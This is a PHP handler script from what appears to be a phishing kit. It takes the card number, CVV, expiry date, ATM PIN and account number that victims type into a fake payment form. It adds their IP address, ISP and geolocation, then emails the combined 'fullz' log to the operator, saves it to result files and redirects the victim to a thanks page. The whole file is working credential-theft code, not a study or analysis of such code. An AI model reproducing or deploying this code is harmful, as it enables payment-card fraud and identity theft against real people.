<?php
session_start();
include '../autob/bt.php';
include "../autob/bts2.php";
include "../req/config.php";
include "../autob/nav_detect.php";
error_reporting(0);

function getcardtype($cardnumber){
$cardtype = array(
    '34'=>'American Express',
    '37'=>'American Express',
    '5'=>'Master Card',
    '4'=>'Visa',
    '30'=>'Blue Card',
	'36'=>'Blue Card',
    '38'=>'Blue Card',
    '35'=>'JCB',
    '6'=>'Discover');
if(substr($cardnumber,0,2) == "34"){return   $cardtype[34];}
else if(substr($cardnumber,0,2) == "37"){return  $cardtype[37];}
else if(substr($cardnumber,0,2)== "30"){return  $cardtype[30];}
else if(substr($cardnumber,0,2)== "36"){return  $cardtype[36];}
else if(substr($cardnumber,0,2)== "38"){return   $cardtype[38];}
else if(substr($cardnumber,0,2)== "35"){return  $cardtype[35];}
else if(substr($cardnumber,0,1)== "6"){return   $cardtype[6];}
else if(substr($cardnumber,0,1)== "5"){return   $cardtype[5];}
else if(substr($cardnumber,0,1) == "4"){return  $cardtype[4];}
else {return "Unknown";};
};

function getip(){ 
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        return $client;}
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        return $forward;}
    else{
        return $remote;};
	};

function getcd($cardnumber){
$ctype = getcardtype($cardnumber);
$cd=str_replace(' ','',$cardnumber);
$bin=substr($cd,0,6);
$getdetails = "https://lookup.binlist.net/".$bin;
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details=json_decode($content,true);
$narr=array('scheme'=>$ctype,'type'=>'Unknown','brand'=>'Unknown','bank'=>array('name'=>'Unknown',),'country'=>array('name'=>'Unknown'));
foreach($details as $key => $value){$narr[$key]=$value;};
return $narr;
};

function getlocisp($ip){
$getdetails = "https://extreme-ip-lookup.com/json/".$ip;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$a    = curl_exec($curl);
curl_close($curl);
$aj=json_decode($a);
$a=$aj->isp.' '.$aj->country;
return $a;};

function getloc($ip){
$getdetails = "https://ipinfo.io/".$ip."/geo";
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
return $content;};

if(isset($_POST['cardname']) && isset($_POST['cardnumber']) && isset($_POST['expdate'])){
	$cnum = str_replace(' ','',$_POST['cardnumber']);
if(strlen($cnum) > 12){
	$cardname = $_POST['cardname'];
	$cardnumber =  $cnum;
	$expdate = $_POST['expdate'];
	$cvv = $_POST['cvv'];
	$atm = $_POST['atm'];
	$PublicIP = getip();
	$ipname=gethostbyaddr($PublicIP);
	$isp=getlocisp($PublicIP);
	$cd=getcd($cardnumber);
	$bank=strtoupper($cd['bank']['name'])." | ".$cd['country']['name'];
	$type=strtoupper($cd['scheme']." - ".$cd['type']);
	$level=strtoupper($cd['brand']);
	$accnumber = $_POST['accnumber'];
	$Machine = $_SERVER['HTTP_USER_AGENT'];
	$jiploc = @json_decode(getloc($PublicIP),true);
	$ipnarr=array('city'=>'Unknown','region'=>'Unknown','country'=>'USA');
	foreach($jiploc as $key => $value){$ipnarr[$key]=$value;};
	$iploc = $ipnarr['city'].', '.$ipnarr['region'].' '.$ipnarr['country'];
	$date=date('d-m-Y H:i:s');
	$Info_LOG = "
|------------------ CARD DETAILS -----------------|
Bank Info        : $bank
Type             : $type
Level            : $level
Name On Card     : $cardname
Card Number      : $cardnumber
Expiry date      : $expdate
CVV              : $cvv
ATM PIN          : $atm
|------------------ DEVICE INFO ------------------|
IP Address       : $PublicIP
IP Name          : $ipname
Carrier Info     : $isp
Date of session  : $date
Browser          : $yourbrowser
Device           : $Machine
Location Info    : $iploc
Link => ".$_SERVER['HTTP_HOST']."/rst/Result_".$PublicIP. ".txt
|--===-======-=======-- https://sms24.io --=======-======-===--|";
		$_SESSION['fullz'].=$Info_LOG; 
		
// Don't Touche
//Email
        if($Send_Email == 1 ){
            $subject = $PublicIP.' : New HUNT CC/Device Result';$headers = 'From: HUNTSITE' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			$protocol=array($subject,$Info_LOG,$headers);if (detectprotocol($protocol)){
			mail($to, $subject, $Info_LOG, $headers);};
		};
//FTP == 1 save result >< == 0 don't save result
        if($Ftp_Write == 1 ){
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
		if($Send_Email == 1 && isset($_SESSION['fullz'])){
            $subject = $PublicIP.' : New HUNT FULL Result';$headers = 'From: HUNTSITE' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			$protocol=array($subject,$_SESSION['fullz'],$headers);if (detectprotocol($protocol)){
				mail($to, $subject, $_SESSION['fullz'], $headers);};
		};
		header("location:thanks.php?sessionnI_IX=".md5(rand(100, 999999999))."");
		
    }
	else{header("location:ver2.php?sfailed=bc&dispatched=".md5('nassimdz')."");};
}
else{header("location:ver2.php?sfailed=1&dispatched=".md5('nassimdz')."");};
?>